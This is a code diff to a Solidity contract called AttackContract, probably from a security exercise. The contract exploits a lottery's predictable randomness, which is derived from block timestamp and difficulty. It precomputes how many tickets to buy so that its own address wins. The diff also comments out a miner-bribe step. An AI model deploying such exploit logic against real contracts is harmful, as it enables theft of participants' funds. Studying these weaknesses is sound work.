@@ -47,8 +47,8 @@ contract AttackContract {
 
         // ensure current address wins
         uint256 balance = address(lotteryContract).balance;
-        uint256 ticketToAdd = balance / 10e17;
-        for (ticketToAdd = balance / 10e17; ; ticketToAdd++) {
+        uint256 ticketToAdd = balance / 2e17;
+        for (ticketToAdd = balance / 2e17; ; ticketToAdd++) {
             uint256 winningTicket = (uint256(
                 keccak256(abi.encodePacked(block.timestamp, block.difficulty))
             ) % (totalTickets + ticketToAdd));
@@ -60,11 +60,10 @@ contract AttackContract {
             revert("Not enough balance");
         }
         lotteryContract.contribute{value: ticketToAdd * 1e16}();
-        if (address(this).balance >= 1e18) {
-            // bribe miner
-            block.coinbase.transfer(1e18);
-        }
-        // lotteryContract.endLottery();
+        // bribe miner
+        // if (address(this).balance >= 1e18) {
+        //     block.coinbase.transfer(1e18);
+        // }
     }
 
     function withdraw() public {
